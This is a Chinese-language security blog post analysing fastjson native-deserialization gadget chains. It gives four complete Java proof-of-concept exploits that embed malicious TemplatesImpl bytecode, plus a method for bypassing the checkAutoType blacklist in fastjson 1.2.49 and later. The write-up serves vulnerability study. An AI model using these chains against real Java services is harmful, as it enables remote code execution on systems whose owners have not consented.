---
title: "fastjson 原生反序列化（obj.toString的四种触发方式）"
onlyTitle: true
date: 2025-4-6 17:59:15
categories:
- java
- 框架漏洞
tags:
- fastjson
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8143.png
---



# fastjson 原生反序列化（obj.toString的四种触发方式）

原生反序列化，指的是readObject入口打依赖，而不是parse这种函数入口。

fastjson parseObject流程分析：https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/

## 漏洞入口

fastjson根据@type还原类，是在本地从0开始实例化，然后调用setter赋值

如果解析函数parse or parseObject里有JSON.toJSON，会调用getter。

toJSON调用getter并没有直接的调用ASMSerializer的write方法。而是反射调用的getter方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325180357107.png)

调用ASMSerializer.write方法是肯定能触发getter的，这是由分析调用setter的过程得出的结论。

注意到JSON类还有一个方法toString，调用到了toJSONString。toJSONString内调用了JSONSerializer.write，这里参数固定为this

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325180506784.png)

跟进这个write，getObjectWriter创建ASMSerializer后调用其write方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325181244183.png)

不管我们使用JSONArray还是JSONObject，都是Map的子类，所以这里getObjectWriter取到的是MapSerializer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325222340775.png)

MapSerializer内的内容也很简单，就是循环map内的类，去调用getObjectWriter创建ASMSerializer，然后调用其write方法进行序列化。此处触发getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325222419745.png)

贴个栈图

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325222620052.png)

JSON是个抽象类，JSONArray和JSONObject都是JSON的子类。所以利用的时候用JSONArray或者JSONObject封装都行。

JSONArray实际是个list形式；JSONObject实际是个map形式。下面均使用JSONObject

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325172133278.png)

想办法触发到JSON.toString就能触发漏洞，手法还是挺多的



## fastjson <= 1.2.48

### 链子1：

```java
BadAttributeValueExpException.readObject -> toString
```

需要反序列化的对象用JSONObject.put或者JSONArray.add添加

POC：

```java

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

//fastjson <= 1.2.48 原生反序列化
//BadAttributeValueExpException.readObject -> toString
public class BadAttributeValueExpException_1_2_48 {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("templateClass",templatesClass);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,jsonObject);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



### 链子2

```java
HashMap.readObject() -> XString.equals() -> toString()
```

这条链子需要进行一个碰撞才能进入equals，具体原理如下：

https://godownio.github.io/2024/09/26/rome-lian/#HashSet-or-HashMap%E9%93%BE

```java
package org.exploit.third.fastjson.nativeDeser;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.xpath.objects.XString;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

//fastjson <= 1.2.48 原生反序列化
//HashMap.readObject() -> XString.equals() -> toString()
public class HashMap_1_2_48 {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("templateClass",templatesClass);
        XString xString = new XString("godown!");
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ", jsonObject);
        hashMap1.put("yy", xString);
        hashMap2.put("zZ", xString);
        hashMap2.put("yy", jsonObject);
        HashMap EvilMap = makeMap(hashMap1,hashMap2);

        serialize(EvilMap);
        unserialize("ser.bin");
    }
    public static HashMap<Object, Object> makeMap(Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        setValue(map, "size", 2); //设置size为2，就代表着有两组
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));  //通过此处来设置的0组和1组，我去，破案了
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setValue(map, "table", tbl);
        return map;
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

为了防止有同学在hashMap那搞混，贴个图

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325224937106.png)



### 链子3

```java
HashMap.readObject() -> AbstractMap.equals -> UIDefault$TextAndMnemonicHashMap.get -> toString
```

很鸡肋，都能用这个了为什么不用链子2，还更短，主要是学习一手HashMap.readObject->HashMap.get(Object)的链子吧

POC：

```java
package org.exploit.third.fastjson.nativeDeser;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import static org.exploit.third.Dubbo.Utils.makeMap;

//fastjson <= 1.2.48 原生反序列化
//HashMap.readObject -> AbstractMap.equals -> javax.swing.UIDefaults$TextAndMnemonicHashMap.get -> toString
public class TextAndMnemonicHashMap_1_2_48 {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("templateClass",templatesClass);
        Class<?> textAndMnemonicHashMapClass = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Constructor<?> constructor = textAndMnemonicHashMapClass.getDeclaredConstructor();
        constructor.setAccessible(true);
        Map textAndMnemonicHashMap1 = (Map) constructor.newInstance();
        Map textAndMnemonicHashMap2 = (Map) constructor.newInstance();

        textAndMnemonicHashMap1.put(jsonObject, null);
        textAndMnemonicHashMap2.put(jsonObject, null);
        HashMap EvilMap = makeMap(textAndMnemonicHashMap1,textAndMnemonicHashMap2);

        serialize(EvilMap);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



### 链子4

```java
EventListenerList.readObject() -> tostring
```

EventListenerList.readObject内对传入的流调用readObject，然后调用add方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406125248674.png)

add里面如果t不是l的子类，会输出异常信息。这里字符串的拼接会触发toString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406125752029.png)

t和l来自listenerList，注意t只能传class，我们就不能传自定义的jsonObject进去，l必须能强转为EventListener，所以必须找一个实现了EventListener的类来包装恶意fastjson类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406130356439.png)

找到一个UndoManager类，继承了UndoableEditLister，该接口继承了EventListener

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132149479.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132216044.png)

UndoManager toString拼接的limit和indexOfNexAdd都是int型，没有利用空间，跟进到super.toString，也就是CompoundEdit类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132257549.png)

父类的edits是个Vector类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132351196.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132405108.png)

Vector.toString会调用到AbstractCollection.toString，循环对Vector内的每个对象调用append

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132717886.png)

append会调用到toString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132836797.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406132841693.png)

详细说来，链子如下：

```java
EventListenerList.readObject() -> UndoManager.tostring -> Vector.toString -> AbstractCollection.toString -> obj.toString
```

POC：

```java
package org.exploit.third.fastjson.nativeDeser;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import javax.swing.undo.UndoableEdit;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Vector;


//fastjson <= 1.2.48 原生反序列化
//EventListenerList.readobject() -> tostring
public class EventListenerList_1_2_48 {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("templateClass",templatesClass);
        EventListenerList eventListenerList = new EventListenerList();
        Field listenerList = EventListenerList.class.getDeclaredField("listenerList");
        listenerList.setAccessible(true);
        Vector vector = new Vector();
        vector.add(jsonObject);
        UndoManager undoManager = new UndoManager();
        Field edit = CompoundEdit.class.getDeclaredField("edits");
        edit.setAccessible(true);
        edit.set(undoManager,vector);

        listenerList.set(eventListenerList,new Object[]{HashMap.class,undoManager});
        serialize(eventListenerList);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



## fastjson >= 1.2.49

从 1.2.49开始，JSONArray和JSONObject添加了自己的readObject方法，在该

* 调用 SecureObjectInputStream.ensureFields() 确保安全字段初始化。
* 检查 SecureObjectInputStream.fields 是否非空且无错误，若满足条件，则创建 SecureObjectInputStream 并调用其 defaultReadObject 方法。
* 若上述条件不满足，直接调用传入的 ObjectInputStream 的 defaultReadObject 方法。
* 遍历 map 中的所有键值对，检查键和值的类型是否符合 ParserConfig.global.checkAutoType 的要求。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406171520453.png)

看到SecureObjectInputStream.resolveClass，如果getClassFromMapping（也就是从mappings中能取出待反序列化类）为空，则调用checkAutoType

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406171729452.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406171940012.png)

跟进到checkAutoType，这个函数我们是相当熟悉了，把TemplatesImpl列入了黑名单

目前看来，正常反序列化进入到SecureObjectInputStream.resolveClass就会被ban掉，有没有手法能绕过呢？

看到`java.io.ObjectInputStream#readObject0`，会根据Bytes中tc的数据类型不同恢复部分对象

```java
try {
            switch (tc) {
                case TC_NULL:
                    return readNull();

                case TC_REFERENCE:
                    return readHandle(unshared);

                case TC_CLASS:
                    return readClass(unshared);

                case TC_CLASSDESC:
                case TC_PROXYCLASSDESC:
                    return readClassDesc(unshared);

                case TC_STRING:
                case TC_LONGSTRING:
                    return checkResolve(readString(unshared));

                case TC_ARRAY:
                    return checkResolve(readArray(unshared));

                case TC_ENUM:
                    return checkResolve(readEnum(unshared));

                case TC_OBJECT:
                    return checkResolve(readOrdinaryObject(unshared));

                case TC_EXCEPTION:
                    IOException ex = readFatalException();
                    throw new WriteAbortedException("writing aborted", ex);

                case TC_BLOCKDATA:
                case TC_BLOCKDATALONG:
                    if (oldMode) {
                        bin.setBlockDataMode(true);
                        bin.peek();             // force header read
                        throw new OptionalDataException(
                            bin.currentBlockRemaining());
                    } else {
                        throw new StreamCorruptedException(
                            "unexpected block data");
                    }

                case TC_ENDBLOCKDATA:
                    if (oldMode) {
                        throw new OptionalDataException(true);
                    } else {
                        throw new StreamCorruptedException(
                            "unexpected end of block data");
                    }

                default:
                    throw new StreamCorruptedException(
                        String.format("invalid type code: %02X", tc));
            }
```

可以看到readNonProxyDesc、readClassDesc、readClass、readOrdinaryObject都调用了readsolveClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406172901159.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406172940966.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406174206907.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406173956182.png)

剩余能用的就是TC_REFERENCE、TC_STRING、TC_LONGSTRING、TC_ARRAY、TC_ENUM、TC_EXCEPTION

很显然其中只有TC_REFERENCE能用

两个相同的对象在同一个反序列化的过程中只会被反序列化一次。那么我们可以在序列化的时候注入两个相同的 `TemplatesImpl` 对象，第二个 `TemplatesImpl` 对象被封装到 `JSONObject` 中。那么在反序列化我们的 `payload` 时，如果先用正常的 `ObjectInputStream` 反序列化了第一个 `TemplatesImpl` 对象，那么在第二次在 `JSONObject.readObject()` 中，就不会再用 `SecureObjectInputStream` 来反序列化这个相同的 `TemplatesImpl` 对象了，就会绕过`checkAutoType()`的检查！

用List、set、map添加一个TemplatesImpl，一个JSONObject（or JSON Array）即可

给一个ArrayList包装的POC（用HashMap，HashSet都OK）：

```java
HashMap EvilMap = makeMap(hashMap1,hashMap2);

ArrayList arrayList = new ArrayList();
arrayList.add(templatesClass);
arrayList.add(EvilMap);
```



总体是学习几个触发toString的方法！